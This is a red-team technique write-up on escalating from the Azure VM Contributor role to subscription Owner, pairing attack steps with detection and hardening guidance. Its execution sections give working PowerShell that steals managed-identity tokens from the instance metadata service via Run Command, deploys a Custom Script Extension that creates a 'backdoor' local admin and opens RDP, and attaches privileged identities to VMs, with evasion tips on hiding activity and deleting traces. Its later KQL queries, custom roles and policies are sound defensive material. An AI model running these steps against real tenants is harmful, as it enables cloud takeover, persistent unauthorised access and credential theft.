# [PE-VALID-012]: Azure VM Contributor to Owner

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PE-VALID-012 |
| **MITRE ATT&CK v18.1** | [T1078.004 - Valid Accounts: Cloud Accounts](https://attack.mitre.org/techniques/T1078/004/) |
| **Tactic** | Privilege Escalation |
| **Platforms** | Entra ID |
| **Severity** | Critical |
| **CVE** | N/A (Architectural design flaw in Azure RBAC; mitigated via PIM and conditions) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | All Azure subscriptions with Virtual Machines; all VM types (Windows, Linux, IaaS) |
| **Patched In** | N/A (No patch; requires organizational hardening via PIM, Conditional Access, and RBAC conditions) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** The Azure Virtual Machine Contributor built-in role is designed to grant permissions to manage virtual machines but explicitly excludes access to the VMs themselves, the storage accounts they use, or the virtual networks they're connected to. However, the Contributor role includes permissions to execute arbitrary commands on VMs via the Azure Run Command feature (`Microsoft.Compute/virtualMachines/runCommand/action`) and to manage VM extensions (`Microsoft.Compute/virtualMachines/extensions/write`), which allow deploying custom scripts. An attacker with Contributor role on a VM can exploit these permissions to: (1) execute commands as SYSTEM (Windows) or root (Linux) on the VM via Run Command, (2) deploy a custom script extension to establish persistent backdoor access, or (3) attach an administrative Managed Identity to the VM and steal its access token to escalate to Owner-level access within the subscription. This creates a direct privilege escalation path from Contributor to Owner without requiring network access to the VM or knowledge of admin credentials.

**Attack Surface:** Azure Resource Manager (ARM) API endpoints, Azure Portal, Azure CLI/PowerShell, VM Run Command feature, Custom Script Extension deployment, Managed Identity attachment mechanism.

**Business Impact:** **Escalation from Contributor to Owner on subscription scope**. An attacker with Contributor role can gain complete control of all resources in the subscription, including: accessing all secrets in Key Vaults, modifying RBAC to create permanent backdoors, creating new resources with elevated managed identities, pivoting to Entra ID Global Admin via service principal creation, or exfiltrating sensitive data from databases and storage accounts.

**Technical Context:** VM-based privilege escalation occurs with full logging in Azure Activity Log (Event: "Invoke Run Command on Virtual Machine"). Exploitation takes 1-5 minutes once Contributor access is obtained. The attack is reversible (disabling extensions, removing managed identities), but by then secondary persistence mechanisms are typically established. Detection requires real-time alerting on Run Command execution and extension deployment, which many organizations lack.

### Operational Risk

- **Execution Risk:** High – Contributor role is commonly granted; VM Run Command is a legitimate administrative feature, making exploitation difficult to distinguish from normal operations.
- **Stealth:** Medium – All operations are logged in Activity Log; organizations without real-time alerting may not detect exploitation for hours or days.
- **Reversibility:** Yes – Removing extensions and disabling VMs can undo the escalation, but secondary persistence is typically established.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 1.1 | Ensure that all Azure subscriptions are monitored for unusual activity |
| **DISA STIG** | AC-2(1) | Account Management – Enforce privileged access management |
| **CISA SCuBA** | CA-7.1 | Implement and maintain access controls based on least privilege |
| **NIST 800-53** | AC-2 | Account Management – Manage information system accounts |
| **GDPR** | Art. 32(1)(a) | Implement appropriate technical measures for data security |
| **DORA** | Art. 9 | Protection and Prevention – Controls against ICT incidents |
| **NIS2** | Art. 21(1)(a) | Cyber Risk Management – Implement risk management measures |
| **ISO 27001** | A.9.2.3 | Management of Privileged Access Rights |
| **ISO 27005** | Risk Scenario | Unauthorized privilege escalation via VM management |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:** Contributor role on a Virtual Machine, resource group, or subscription scope.
- **Required Access:** Network connectivity to Azure Portal (https://portal.azure.com), Azure REST API (https://management.azure.com), or Azure CLI/PowerShell.

**Supported Versions:**
- **Azure:** All subscriptions
- **VM Types:** Windows (Server 2016-2025), Linux (any distribution with VM Agent)
- **PowerShell:** Az module 9.0+ (Latest: 11.x)
- **Azure CLI:** 2.40+
- **Azure Portal:** Latest version (browser-based)

**Required Tools:**
- [Az PowerShell Module](https://learn.microsoft.com/en-us/powershell/azure/install-az-ps)
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/install-azure-cli)
- [MicroBurst](https://github.com/NetSPI/MicroBurst) (Privilege escalation scanning)
- [Azure VM extension exploitation scripts](https://github.com/NetSPI/MicroBurst)
- Native tools: `curl`, `Invoke-WebRequest` (PowerShell), `jq`

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Management Station / PowerShell Reconnaissance

#### Step 1: Identify Virtual Machines with Managed Identities and Contributor Access

```powershell
# Connect to Azure
Connect-AzAccount

# List all VMs the current user can access (filtered by Contributor role)
Get-AzVM | Where-Object {
    $vmRoles = Get-AzRoleAssignment -Scope $_.Id -ErrorAction SilentlyContinue
    $vmRoles | Where-Object { $_.RoleDefinitionName -contains "Contributor" }
} | Select-Object -Property Name, ResourceGroupName, @{Name='HasManagedIdentity'; Expression={$_.Identity -ne $null}}

# For each VM with managed identity, check the managed identity's roles
Get-AzVM | Where-Object { $_.Identity } | ForEach-Object {
    $vm = $_
    Write-Host "VM: $($vm.Name)"
    
    # Get the managed identity's permissions
    $identityId = $vm.Identity.PrincipalId
    Get-AzRoleAssignment -ObjectId $identityId | Select-Object -Property RoleDefinitionName, Scope
}
```

**What to Look For:**
- VMs with System-Assigned or User-Assigned Managed Identities.
- Managed identities with Owner, Contributor, or User Access Administrator roles.
- VMs accessible to the current user via Contributor role.

#### Step 2: Verify Run Command Capability

```powershell
# Check if the current user has Microsoft.Compute/virtualMachines/runCommand/action permission
$vmResourceId = (Get-AzVM -ResourceGroupName "MyResourceGroup" -Name "MyVM").Id

# Test by listing the current permissions
Get-AzRoleAssignment -Scope $vmResourceId | Where-Object { $_.RoleDefinitionName -eq "Contributor" }

# If the role assignment exists, Run Command capability is available
Write-Host "Run Command is available for this VM"
```

**What to Look For:**
- Confirmation that the Contributor role includes Run Command permissions.
- Verification that the VM is in a running state (required for Run Command execution).

#### Step 3: Enumerate Managed Identities Associated with VM

```powershell
# Get the VM and check for managed identities
$vm = Get-AzVM -ResourceGroupName "MyResourceGroup" -Name "MyVM"

if ($vm.Identity) {
    Write-Host "VM has managed identity:"
    Write-Host "  Type: $($vm.Identity.Type)"
    
    if ($vm.Identity.Type -contains "UserAssigned") {
        Write-Host "  User-Assigned Identities:"
        foreach ($uamiId in $vm.Identity.UserAssignedIdentities.Keys) {
            Write-Host "    - $uamiId"
            
            # Get the roles assigned to this UAMI
            $uamiPrincipalId = (Get-AzResource -ResourceId $uamiId).ManagedIdentityPrincipalId
            $roles = Get-AzRoleAssignment -ObjectId $uamiPrincipalId
            $roles | ForEach-Object { Write-Host "      Role: $($_.RoleDefinitionName) on $($_.Scope)" }
        }
    }
    
    if ($vm.Identity.Type -contains "SystemAssigned") {
        Write-Host "  System-Assigned Identity (PrincipalId): $($vm.Identity.PrincipalId)"
        $roles = Get-AzRoleAssignment -ObjectId $vm.Identity.PrincipalId
        $roles | ForEach-Object { Write-Host "    Role: $($_.RoleDefinitionName) on $($_.Scope)" }
    }
}
```

**What to Look For:**
- Managed identities with subscript-level role assignments.
- Owner or high-privilege roles on managed identities (escalation opportunity).

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Privilege Escalation via VM Run Command to Owner (Direct)

**Supported Versions:** All Azure VMs with Contributor access

#### Step 1: Identify Target VM with Managed Identity

**Objective:** Select a VM with an Owner-level Managed Identity assigned.

**Command (PowerShell):**
```powershell
# Get all VMs with owner-level managed identities
Get-AzVM | Where-Object { $_.Identity } | ForEach-Object {
    $vm = $_
    $identityId = $vm.Identity.PrincipalId
    $roles = Get-AzRoleAssignment -ObjectId $identityId
    
    if ($roles | Where-Object { $_.RoleDefinitionName -eq "Owner" }) {
        Write-Host "Target VM found: $($vm.Name)"
        Write-Host "  Managed Identity has Owner role"
        Write-Host "  ResourceGroup: $($vm.ResourceGroupName)"
    }
}
```

**Expected Output:**
```
Target VM found: production-vm-01
  Managed Identity has Owner role
  ResourceGroup: Production
```

#### Step 2: Execute Command on VM as SYSTEM/root via Run Command

**Objective:** Execute arbitrary commands on the VM with elevated privileges.

**Command (PowerShell - Windows VM):**
```powershell
# Execute a PowerShell command that steals the managed identity token
$vm = Get-AzVM -ResourceGroupName "Production" -Name "production-vm-01"

$scriptContent = @'
# Retrieve the managed identity's access token
$token = Invoke-WebRequest -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://management.azure.com/" `
  -Headers @{Metadata="true"} `
  -UseBasicParsing | ConvertFrom-Json

# Save token to a file accessible to the attacker
$token.access_token | Out-File -FilePath "C:\Windows\Temp\msi_token.txt"

Write-Host "Token saved to C:\Windows\Temp\msi_token.txt"
'@

# Execute the script on the VM
$result = Invoke-AzVMRunCommand -ResourceGroupName $vm.ResourceGroupName `
  -Name $vm.Name `
  -CommandId "RunPowerShellScript" `
  -ScriptPath $scriptContent

Write-Host "Run Command Output:"
$result.Value[0].Message
```

**Expected Output:**
```
Run Command Output:
Token saved to C:\Windows\Temp\msi_token.txt
```

**What This Means:**
- The command executed as SYSTEM (Windows) or root (Linux) on the VM.
- The managed identity's access token is now stored on the VM and can be exfiltrated.
- With Owner-level token, the attacker has full control of the subscription.

**OpSec & Evasion:**
- Run Command execution is fully logged in Azure Activity Log (Event: "Invoke Run Command on Virtual Machine").
- To evade detection, execute during maintenance windows or hide within normal administrative activity.
- Save token to a temporary file and delete immediately after exfiltration.
- Detection likelihood: **High** – Activity Log captures Run Command execution; Sentinel should alert on this.

**Troubleshooting:**
- **Error:** `The VM status is not running`
  - **Cause:** VM is deallocated or stopped.
  - **Fix:** Start the VM: `Start-AzVM -ResourceGroupName "Production" -Name "production-vm-01"`

- **Error:** `The VMAgent is not running on the VM`
  - **Cause:** Azure VM Agent is not installed or running on the target VM.
  - **Fix:** Ensure VM Agent is installed and running; may require VM reboot.

#### Step 3: Authenticate as the Managed Identity Using Stolen Token

**Objective:** Use the stolen token to authenticate to Azure and assume Owner role on subscription.

**Command (PowerShell - from attacker machine):**
```powershell
# Retrieve the token from the VM (exfiltrated via SMB, RDP file transfer, etc.)
$accessToken = Get-Content "C:\stolen_token.txt"

# Parse the token to get subscription info
$jwtParts = $accessToken.Split('.')
$payloadJson = [System.Text.Encoding]::Utf8.GetString([Convert]::FromBase64String($jwtParts[1] + '=='))
$payload = $payloadJson | ConvertFrom-Json

Write-Host "Token claims:"
Write-Host "  Tenant: $($payload.tid)"
Write-Host "  Subject: $($payload.sub)"
Write-Host "  Scopes: $($payload.scp)"

# Authenticate to Azure using the stolen token
Connect-AzAccount -AccessToken $accessToken -Tenant $payload.tid -AccountId $payload.sub

# Verify ownership
Get-AzContext

# Now enumerate and modify resources as Owner
Get-AzSubscription
Get-AzResource | Select-Object -Property Name, Type, ResourceGroupName
```

**Expected Output:**
```
Token claims:
  Tenant: 22222222-2222-2222-2222-222222222222
  Subject: 11111111-1111-1111-1111-111111111111
  Scopes: Reader Contributor User.ReadWrite.All

Name                         Subscription                  Tenant                       Environment
----                         ----                          ------                       -----------
<managed-identity>           <subscription-id>             <tenant-id>                  AzureCloud
```

---

### METHOD 2: Privilege Escalation via Custom Script Extension

**Supported Versions:** All Azure VMs

#### Step 1: Create a Malicious Custom Script Extension

**Objective:** Deploy a custom script that executes as SYSTEM on the VM and establishes persistence.

**Command (PowerShell):**
```powershell
# Prepare the malicious script content
$scriptContent = @'
# This script will be executed as SYSTEM on the VM
Write-Host "Executing as SYSTEM"

# Create a backdoor local admin user (if not already present)
$username = "backdoor"
$password = ConvertTo-SecureString "Backdoor@123!" -AsPlainText -Force

if (-not (Get-LocalUser -Name $username -ErrorAction SilentlyContinue)) {
    New-LocalUser -Name $username -Password $password -FullName "Backdoor User" -Description "Maintenance Account" | Out-Null
    Add-LocalGroupMember -Group "Administrators" -Member $username
    Write-Host "Backdoor user created"
}

# Enable RDP if disabled
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# Add firewall rule for RDP
New-NetFirewallRule -DisplayName "Allow RDP" -Direction Inbound -LocalPort 3389 -Protocol TCP -Action Allow -Enabled True -ErrorAction SilentlyContinue

Write-Host "RDP enabled and backdoor user configured"
'@

# Save script to a file
$scriptPath = "C:\Temp\malicious_script.ps1"
$scriptContent | Out-File -FilePath $scriptPath

# Get the target VM
$vm = Get-AzVM -ResourceGroupName "Production" -Name "production-vm-01"

# Deploy the custom script extension
Set-AzVMExtension -ResourceGroupName $vm.ResourceGroupName `
  -VMName $vm.Name `
  -Name "CustomScriptExtension" `
  -Publisher "Microsoft.Compute" `
  -ExtensionType "CustomScriptExtension" `
  -TypeHandlerVersion "1.10" `
  -SettingString "{`"fileUris`": [`"file://$scriptPath`"], `"commandToExecute`": `"powershell -ExecutionPolicy Unrestricted -File $scriptPath`"}"

Write-Host "Custom Script Extension deployed"
```

**Expected Output:**
```
Custom Script Extension deployed
```

**What This Means:**
- The custom script extension is deployed to the VM.
- When the extension runs, it executes as SYSTEM and creates a backdoor admin user.
- The attacker now has persistent RDP access to the VM as the "backdoor" user.

**OpSec & Evasion:**
- Custom Script Extension deployment is logged in Activity Log (Event: "Create or Update Virtual Machine Extension").
- Name the extension with a legitimate name (e.g., "ConfigurationExtension", "MonitoringExtension").
- Delete the extension after establishing persistence to reduce visibility.
- Detection likelihood: **High** – Extension creation and execution are logged; unusual script content may trigger alerts.

#### Step 2: Establish Persistence via Custom Extension

**Objective:** Use the backdoor admin user to maintain long-term access.

**Command (From attacker - RDP to VM):**
```powershell
# Connect via RDP using the backdoor credentials
# mstsc /v:production-vm-01.cloudapp.azure.com /u:backdoor

# Once connected, verify access to the managed identity
Invoke-WebRequest -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://management.azure.com/" `
  -Headers @{Metadata="true"} `
  -UseBasicParsing | ConvertFrom-Json | Select-Object -Property access_token, expires_in

# The token can be exfiltrated for use outside the VM
```

---

### METHOD 3: Privilege Escalation via Managed Identity Attachment

**Supported Versions:** All Azure VMs without User-Assigned Managed Identities

#### Step 1: Identify Administrative User-Assigned Managed Identity

**Objective:** Find a User-Assigned Managed Identity with Owner or Contributor role.

**Command (PowerShell):**
```powershell
# List all User-Assigned Managed Identities with high-privilege roles
Get-AzUserAssignedIdentity | ForEach-Object {
    $uami = $_
    $roles = Get-AzRoleAssignment -ObjectId $uami.PrincipalId
    
    $privilegedRoles = $roles | Where-Object { $_.RoleDefinitionName -in ("Owner", "Contributor", "User Access Administrator") }
    
    if ($privilegedRoles) {
        Write-Host "Privileged UAMI found: $($uami.Name)"
        Write-Host "  Resource Group: $($uami.ResourceGroupName)"
        Write-Host "  Principal ID: $($uami.PrincipalId)"
        $privilegedRoles | ForEach-Object { Write-Host "    Role: $($_.RoleDefinitionName) on $($_.Scope)" }
    }
}
```

**Expected Output:**
```
Privileged UAMI found: prod-automation-identity
  Resource Group: Production
  Principal ID: 11111111-1111-1111-1111-111111111111
    Role: Owner on /subscriptions/12345678-1234-1234-1234-123456789012
```

#### Step 2: Attach the Managed Identity to Target VM

**Objective:** Assign the privileged UAMI to a VM that the attacker has Contributor access to.

**Command (PowerShell):**
```powershell
# Get the privileged UAMI resource ID
$uami = Get-AzUserAssignedIdentity -Name "prod-automation-identity" -ResourceGroupName "Production"

# Get the target VM
$vm = Get-AzVM -ResourceGroupName "Production" -Name "production-vm-01"

# Attach the UAMI to the VM
Update-AzVM -ResourceGroupName $vm.ResourceGroupName `
  -VM (Get-AzVM -ResourceGroupName $vm.ResourceGroupName -Name $vm.Name | `
    Add-AzVMUserAssignedIdentity -IdentityId $uami.Id) | Out-Null

Write-Host "Privileged UAMI attached to VM"

# Verify attachment
$updatedVM = Get-AzVM -ResourceGroupName $vm.ResourceGroupName -Name $vm.Name
$updatedVM.Identity.UserAssignedIdentities
```

**Expected Output:**
```
Privileged UAMI attached to VM

Key                                                     Value
---                                                     -----
/subscriptions/.../resourceGroups/Production/providers/Microsoft.ManagedIdentity/userAssignedIdentities/prod-automation-identity   Microsoft.Azure.Management.Compute.Models.UserAssignedIdentitiesValue
```

**What This Means:**
- The Owner-level UAMI is now attached to the VM.
- Any code executed on the VM can now query IMDS and obtain an Owner-level token.
- The attacker has escalated from Contributor to Owner via UAMI attachment.

#### Step 3: Steal the Attached UAMI Token

**Objective:** Execute commands on the VM to steal the newly attached UAMI's access token.

**Command (PowerShell - Run Command on VM):**
```powershell
# Use Run Command to execute code that steals the Owner-level token
$scriptContent = @'
# Query IMDS for the Owner-level UAMI token
$token = Invoke-WebRequest -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://management.azure.com/" `
  -Headers @{Metadata="true"} `
  -UseBasicParsing | ConvertFrom-Json

Write-Host "Owner-level token obtained:"
Write-Host $token.access_token
'@

Invoke-AzVMRunCommand -ResourceGroupName "Production" `
  -Name "production-vm-01" `
  -CommandId "RunPowerShellScript" `
  -ScriptPath $scriptContent
```

**Expected Output:**
```
Owner-level token obtained:
eyJhbGciOiJSUzI1NiIsImtpZCI6IjEyMzQ1Njc4OTAiLCJ0eXAiOiJKV1QifQ...
```

---

## 6. ATTACK SIMULATION & VERIFICATION

This technique does not map to Atomic Red Team. Verification requires:

1. **Test Environment Setup:**
   - Create an Azure VM with Contributor RBAC role assigned.
   - Optionally, attach an Owner-level Managed Identity to the VM.
   - Execute Methods 1-3 to verify privilege escalation paths.

2. **Detection Verification:**
   - Enable Azure Activity Log monitoring and Sentinel rules.
   - Execute privilege escalation methods.
   - Verify that Run Command execution, Extension creation, and Managed Identity attachment generate alerts.

---

## 7. TOOLS & COMMANDS REFERENCE

### Az PowerShell Module

**Official Documentation:** [Azure PowerShell - Virtual Machines](https://learn.microsoft.com/en-us/powershell/module/az.compute/)

**Version:** 9.0+ (Latest: 11.x)

**Key Commands for VM Privilege Escalation:**
```powershell
Get-AzVM                                          # List VMs
Get-AzRoleAssignment -Scope $vmId                # Check VM permissions
Invoke-AzVMRunCommand                            # Execute commands on VM
Set-AzVMExtension                                # Deploy custom script extension
Get-AzVMExtension                                # List VM extensions
Update-AzVM -VM ... Add-AzVMUserAssignedIdentity # Attach managed identity
```

### Azure CLI

**Key Commands for VM Privilege Escalation:**
```bash
az vm run-command invoke -g <RG> -n <VM> --command-id RunPowerShellScript --scripts "command"  # Execute command
az vm extension set --publisher Microsoft.Compute --name CustomScriptExtension --resource-group <RG> --vm-name <VM>  # Deploy extension
az vm identity assign -g <RG> -n <VM> --identities "<UAMI_ID>"  # Attach UAMI
```

### MicroBurst

**Repository:** [NetSPI/MicroBurst](https://github.com/NetSPI/MicroBurst)

**Installation:**
```powershell
Import-Module .\MicroBurst.psm1
```

**Key Commands:**
```powershell
Invoke-AzureManagedIdentityRoleEnumeration    # Enumerate MI roles
Invoke-AzureVMBulkStatus                      # Check VM status/permissions
Get-AzureRMVMRole                             # Identify VM with privileged roles
```

---

## 8. MICROSOFT SENTINEL DETECTION

### Query 1: VM Run Command Execution (Privilege Escalation Detection)

**Rule Configuration:**
- **Required Table:** AzureActivity
- **Required Fields:** OperationName, Caller, ResourceId, ActivityStatus
- **Alert Severity:** High
- **Frequency:** Real-time (5 minutes)
- **Applies To Versions:** All

**KQL Query:**
```kusto
// Detect VM Run Command execution, especially from non-admin accounts
AzureActivity
| where OperationNameValue == "Microsoft.Compute/virtualMachines/runCommand/action"
| where ActivityStatusValue == "Succeeded"
| extend CallerUserName = tostring(CallerIpAddress)
| extend VMName = tostring(todynamic(Properties).resource)
| extend SubscriptionId = tostring(SubscriptionId)
| extend CallerPrincipalId = tostring(CallerIpAddress)
| summarize Count = count(), FirstExecution = min(TimeGenerated), LastExecution = max(TimeGenerated) 
            by Caller, VMName, SubscriptionId, ResourceGroup
| where Count >= 1  // Alert on every Run Command execution (or adjust threshold)
| order by FirstExecution desc
```

**What This Detects:**
- Any execution of Run Command on a VM.
- Indicates potential privilege escalation or backdoor installation.
- Can be correlated with Contributor role assignments to identify escalation attempts.

### Query 2: Custom Script Extension Deployment (Persistence Detection)

**Rule Configuration:**
- **Required Table:** AzureActivity
- **Alert Severity:** High
- **Frequency:** Real-time

**KQL Query:**
```kusto
// Detect Custom Script Extension creation or modification
AzureActivity
| where OperationNameValue in ("Microsoft.Compute/virtualMachines/extensions/write", 
                               "Microsoft.Compute/virtualMachines/extensions/create",
                               "Microsoft.ClassicCompute/virtualMachines/extensions/write")
| where ActivityStatusValue == "Succeeded"
| extend ExtensionType = tostring(todynamic(Properties).extensionType)
| extend VMName = tostring(todynamic(Properties).resource)
| where ExtensionType == "CustomScriptExtension"
| summarize by TimeGenerated, Caller, VMName, ResourceGroup, OperationNameValue
```

**What This Detects:**
- Deployment of CustomScriptExtension to VMs.
- Potential backdoor installation or persistence mechanism.

### Query 3: Managed Identity Attachment to VM

**Rule Configuration:**
- **Required Table:** AzureActivity
- **Alert Severity:** Medium-High
- **Frequency:** 30 minutes

**KQL Query:**
```kusto
// Detect when a Managed Identity is attached to a VM
AzureActivity
| where OperationNameValue == "Microsoft.Compute/virtualMachines/write"
    and tostring(Properties) contains "identity"
| extend VMName = tostring(todynamic(Properties).resource)
| extend IdentityId = tostring(todynamic(Properties).identity)
| summarize by TimeGenerated, Caller, VMName, IdentityId, ResourceGroup
// Correlate with high-privilege identity roles for escalation detection
```

**What This Detects:**
- Attachment of User-Assigned Managed Identities to VMs.
- May indicate privilege escalation via UAMI attachment.

---

## 9. WINDOWS EVENT LOG MONITORING

### Event ID 4625 & 4624 (Failed/Successful Logons - For Backdoor Access Detection)

**Log Source:** Security

**Trigger:** Failed RDP login attempts followed by successful access using newly created account (e.g., "backdoor")

**Filter:** LogonType = 10 (RDP) and AccountName = "backdoor"

**Manual Configuration Steps (Group Policy):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Detailed Tracking**
3. Enable **Audit Logon** (Success and Failure)
4. Set to: **Success and Failure**
5. Run `gpupdate /force` on VMs

### Event ID 4697 (Security policy changed - UAC/Firewall rule addition)

**Log Source:** Security

**Trigger:** New firewall rule creation (for RDP access); UAC policy changes

**Filter:** Target account = "backdoor" or Rule name contains "RDP"

---

## 10. MICROSOFT DEFENDER FOR CLOUD

### Alert: Suspicious VM Run Command Execution

**Alert Name:** `Suspicious script execution detected on virtual machine`

**Severity:** High

**Description:** A user with Contributor (not Admin) role executed an arbitrary script on a VM, potentially indicating privilege escalation.

**Applies To:** All VMs with Defender for Servers enabled

**Remediation:**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud** → **Security alerts**
2. Click on alert to view details
3. **Determine legitimacy:**
   - Is the user authorized to execute scripts on this VM?
   - Is the script content legitimate or suspicious?
4. **If malicious:**
   - Stop the VM: `Stop-AzVM -ResourceGroupName <RG> -Name <VM>`
   - Isolate from network (remove network adapter)
   - Collect forensics (VM snapshot, disk copy)
   - Remove any backdoor accounts created by the script
   - Redeploy VM from clean image

---

## 11. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

### Query: VM Run Command and Extension Changes

```powershell
# Search for Run Command and Extension creation events
Search-UnifiedAuditLog -Operations "Invoke Run Command on Virtual Machine", "Create or Update Virtual Machine Extension" `
  -StartDate (Get-Date).AddDays(-7) -EndDate (Get-Date) |
  Select-Object @{n='User';e={$_.UserIds}}, @{n='Operation';e={$_.Operations}}, `
  @{n='Timestamp';e={$_.CreationDate}}, @{n='Resource';e={$_.ObjectId}} |
  Export-Csv -Path "C:\Incident\vm_activity.csv"
```

---

## 12. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

- **Revoke or Restrict Contributor Role on VMs:** Only grant Contributor or higher roles to trusted administrators; use Just-In-Time (JIT) access for emergency scenarios.
  
  **Applies To Versions:** All Azure subscriptions
  
  **Manual Steps (Azure Portal):**
  1. Navigate to **Azure Portal** → **Virtual Machines** → Select VM
  2. Go to **Access Control (IAM)** → **Role Assignments**
  3. Identify all users/groups with Contributor or Owner roles
  4. For each non-essential assignment: Click **Remove** → **Yes**
  5. If the user still needs VM access, assign a more granular role:
     - **Virtual Machine Administrator Login** (for RDP/SSH as admin)
     - **Virtual Machine User Login** (for RDP/SSH as standard user)
  
  **PowerShell Script to Audit and Restrict:**
  ```powershell
  # Find all Contributor assignments on VMs
  Get-AzVM | ForEach-Object {
    $vm = $_
    $assignments = Get-AzRoleAssignment -Scope $vm.Id | Where-Object { $_.RoleDefinitionName -eq "Contributor" }
    
    foreach ($assignment in $assignments) {
      Write-Host "Removing Contributor from: $($assignment.DisplayName) on VM $($vm.Name)"
      Remove-AzRoleAssignment -ObjectId $assignment.ObjectId -RoleDefinitionName "Contributor" -Scope $vm.Id -Confirm:$false
    }
  }
  ```
  
  **Validation Command:**
  ```powershell
  # Verify no Contributor roles remain on VMs (or only on approved accounts)
  Get-AzVM | ForEach-Object {
    Get-AzRoleAssignment -Scope $_.Id | Where-Object { $_.RoleDefinitionName -eq "Contributor" }
  }
  
  # Expected: No output (or only approved accounts if some Contributor access is necessary)
  ```

- **Implement Privileged Identity Management (PIM) for VM Access:** Enforce time-limited, approval-based access instead of standing permissions.
  
  **Applies To Versions:** All
  
  **Manual Steps (Azure Portal):**
  1. Navigate to **Azure Portal** → **Entra ID** → **Privileged Identity Management** → **Azure Resources**
  2. Click **Manage** → Select subscription
  3. Go to **Roles**
  4. For each privileged role (Owner, Contributor):
     - Set **Assignment type** to "Eligible" (not "Active")
     - Enable **MFA required on activation**: ON
     - Set **Maximum activation duration**: 4 hours
     - Enable **Approval required**: ON
  5. Users must request and be approved for temporary Contributor access
  
  **Validation:**
  ```powershell
  # Verify no permanent Contributor assignments on subscriptions
  Get-AzRoleAssignment -RoleDefinitionName "Contributor" | Where-Object { $_.Scope -like "*/subscriptions/*" } | Select-Object -Property DisplayName, Scope
  
  # Expected: Minimal or zero results
  ```

- **Block VM Run Command Execution via Conditional Access:** Prevent Contributor-level principals from using Run Command.
  
  **Applies To Versions:** All
  
  **Manual Steps (Custom RBAC Role):**
  1. Navigate to **Azure Portal** → **Subscriptions** → **Access Control (IAM)** → **Roles**
  2. Click **+ Create custom role**
  3. Name: `Virtual Machine Contributor (No RunCommand)`
  4. Permissions:
     - **Allow:**
       - Microsoft.Compute/virtualMachines/read
       - Microsoft.Compute/virtualMachines/write
       - Microsoft.Compute/virtualMachines/delete
     - **Deny:**
       - Microsoft.Compute/virtualMachines/runCommand/* (BLOCKED)
       - Microsoft.Compute/virtualMachines/extensions/* (BLOCKED)
  5. Assign this custom role instead of built-in Contributor
  
  **PowerShell to Create Custom Role:**
  ```powershell
  $customRole = @{
    Name = "Virtual Machine Contributor (No RunCommand)"
    Description = "Manage VMs without Run Command or Extension permissions"
    Actions = @(
      "Microsoft.Compute/virtualMachines/read"
      "Microsoft.Compute/virtualMachines/write"
      "Microsoft.Compute/virtualMachines/delete"
      "Microsoft.Compute/virtualMachines/start/action"
      "Microsoft.Compute/virtualMachines/restart/action"
      "Microsoft.Compute/virtualMachines/stop/action"
    )
    NotActions = @(
      "Microsoft.Compute/virtualMachines/runCommand/*"
      "Microsoft.Compute/virtualMachines/extensions/*"
    )
    AssignableScopes = @("/subscriptions/<SUBSCRIPTION_ID>")
  }
  
  New-AzRoleDefinition -Role $customRole | Out-Null
  ```

- **Restrict Managed Identity Assignment to VMs:** Prevent users from attaching arbitrary managed identities.
  
  **Manual Steps (Azure Policy):**
  1. Navigate to **Azure Portal** → **Policy** → **Definitions** → **+ Policy definition**
  2. Name: `Restrict Managed Identity Assignment to Pre-approved Identities`
  3. Policy rule:
     ```json
     {
       "if": {
         "allOf": [
           { "field": "type", "equals": "Microsoft.Compute/virtualMachines" },
           { "field": "identity.userAssignedIdentities", "exists": true },
           { "not": { "field": "identity.userAssignedIdentities[*]", "like": "/subscriptions/.../approved-identities/*" } }
         ]
       },
       "then": { "effect": "deny" }
     }
     ```
  4. Assign policy to subscription
  5. Create an approved list of UAMI resource IDs that can be attached

### Priority 2: HIGH

- **Monitor and Alert on VM Extension Deployments:** Enable real-time alerting for Custom Script Extension creation.
  
  **Manual Steps (Sentinel - create detection rule above)**
  1. In Sentinel, create scheduled query rule (see Detection section)
  2. Set alert frequency to **Real-time (5 minutes)**
  3. Configure action: **Send email to SOC**, **Create incident**, **Trigger SOAR automation**

- **Audit and Disable Unnecessary VM Extensions:** Identify and remove any unexpected Custom Script Extensions.
  
  **PowerShell Script:**
  ```powershell
  # List all VM extensions across subscription
  Get-AzVM | ForEach-Object {
    $vm = $_
    Get-AzVMExtension -ResourceGroupName $vm.ResourceGroupName -VMName $vm.Name | ForEach-Object {
      Write-Host "VM: $($vm.Name), Extension: $($_.Name), Type: $($_.ExtensionType)"
      
      # Flag Custom Script Extensions for review
      if ($_.ExtensionType -eq "CustomScriptExtension") {
        Write-Host "  ⚠️ Custom Script Extension detected - review for legitimacy"
      }
    }
  }
  ```

- **Implement Managed Service Identity (MSI) Role Least Privilege:** Ensure VM managed identities have minimal necessary roles.
  
  **Manual Steps:**
  1. Identify all VMs with System-Assigned or User-Assigned managed identities
  2. For each MSI:
     - Review assigned roles
     - If role is Owner/Contributor at subscription scope: REVOKE and assign minimal scope (resource group or specific resource)
     - If role includes unnecessary permissions: Replace with custom role with only needed actions
  3. Document all MSI-to-role mappings in a compliance spreadsheet

---

## 13. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **Activity Log Events:**
  - "Microsoft.Compute/virtualMachines/runCommand/action" - Suspicious Run Command execution
  - "Microsoft.Compute/virtualMachines/extensions/write" - Custom Script Extension creation
